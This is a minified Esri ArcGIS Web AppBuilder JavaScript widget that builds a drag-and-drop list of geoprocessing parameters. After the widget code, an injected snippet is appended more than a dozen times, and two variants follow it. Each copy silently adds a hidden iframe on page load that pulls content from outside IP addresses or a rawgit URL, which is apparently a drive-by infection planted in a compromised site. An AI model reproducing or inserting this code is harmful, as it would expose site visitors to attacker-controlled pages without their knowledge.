// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/setting/ParamNode.html":'\x3cdiv class\x3d"link-action-node param-node" data-dojo-attach-point\x3d"displayNode"\x3e\r\n  \x3cdiv\x3e\r\n    \x3cspan\x3e${nls_name}:\x3c/span\x3e\r\n    \x3cspan style\x3d"margin: 2px"\x3e${param_name}\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cspan\x3e${nls_type}:\x3c/span\x3e\r\n    \x3cspan style\x3d"margin: 2px"\x3e${param_dataType}\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n    \x3cspan\x3e${nls_required}:\x3c/span\x3e\r\n    \x3cspan style\x3d"margin: 2px"\x3e${param_required}\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"action-group dojoDndHandle" data-dojo-attach-point\x3d"actionNode"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Geoprocessing/setting/ParamNodeAvatar.html":'\x3cspan class\x3d"avatarText"\x3e${param_name}\x3c/span\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/string dojo/aspect dojo/on dojo/dom-class dojo/dom-style dojo/dom dojo/Evented dojo/dnd/Source dojo/dom-construct dijit/_WidgetBase dojo/text!./ParamNode.html dojo/text!./ParamNodeAvatar.html".split(" "),function(k,e,l,g,m,n,d,f,p,q,r,h,t,u,v){return k([t,q],{params:void 0,nls:void 0,direction:void 0,useResultMapServer:!1,resultLayers:[],postCreate:function(){this.inherited(arguments);this.dndObj=new r(this.domNode,{singular:!0,withHandles:!0,
accept:[this.direction],creator:e.hitch(this,this._paramNodeCreator)});this.dndObj.insertNodes(!1,this.params);l.some(this.params,e.hitch(this,function(a){if("MapServiceLayer"===a.dataType)return this.resultLayers=a.layerNames,!0}));!0===this.useResultMapServer?this.hideOutputInResultMap():this.showOutputInResultMap();this.own(n(this.domNode,"click",e.hitch(this,this.select)));m.after(this.dndObj,"onDrop",e.hitch(this,this.handleDrop))},_paramNodeCreator:function(a,b){return{node:"avatar"===b?h.toDom(g.substitute(v,
{param_name:a.name})):h.toDom(g.substitute(u,{nls_name:this.nls.name,nls_type:this.nls.type,nls_required:this.nls.required,param_name:a.name,param_dataType:a.dataType,param_required:a.required})),data:a,type:[this.direction]}},getSize:function(){return this.params.length},selectDefault:function(){var a=this.dndObj.getAllNodes()[0],b=this.dndObj.getItem(a.id);d.add(a,"dojoDndItemAnchor");this.emit("select-param",b.data,this.direction)},select:function(a){var b=a.target||a.srcElement,c;this.dndObj.getAllNodes().forEach(function(a){p.isDescendant(b,
a)?(c=a,d.add(a,"dojoDndItemAnchor")):d.remove(a,"dojoDndItemAnchor")});c&&(a=this.dndObj.getItem(c.id),this.emit("select-param",a.data,this.direction))},clearSelection:function(){this.dndObj.getAllNodes().forEach(function(a){d.remove(a,"dojoDndItemAnchor")})},handleDrop:function(a,b){var c=b[1][0];this.dndObj.getAllNodes().forEach(function(a){a.id!==c.id&&d.remove(a,"dojoDndItemAnchor")});a=this.dndObj.getItem(c.id);this.emit("select-param",a.data,this.direction)},getConfig:function(){var a=[];this.dndObj.getAllNodes().forEach(function(b){b=
this.dndObj.getItem(b.id);a.push(b.data)},this);return a},hideOutputInResultMap:function(){this.dndObj.getAllNodes().forEach(function(a){var b=this.dndObj.getItem(a.id);!(0<=this.resultLayers.indexOf(b.data.name)||0<=this.resultLayers.indexOf(b.data.label))||"GPFeatureRecordSetLayer"!==b.data.dataType&&"GPRasterDataLayer"!==b.data.dataType&&"GPRecordSet"!==b.data.dataType||f.set(a,"display","none");"MapServiceLayer"===b.data.dataType&&f.set(a,"display","")},this)},showOutputInResultMap:function(){this.dndObj.getAllNodes().forEach(function(a){var b=
this.dndObj.getItem(a.id);!(0<=this.resultLayers.indexOf(b.data.name)||0<=this.resultLayers.indexOf(b.data.label))||"GPFeatureRecordSetLayer"!==b.data.dataType&&"GPRasterDataLayer"!==b.data.dataType&&"GPRecordSet"!==b.data.dataType||f.set(a,"display","");"MapServiceLayer"===b.data.dataType&&f.set(a,"display","none")},this)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});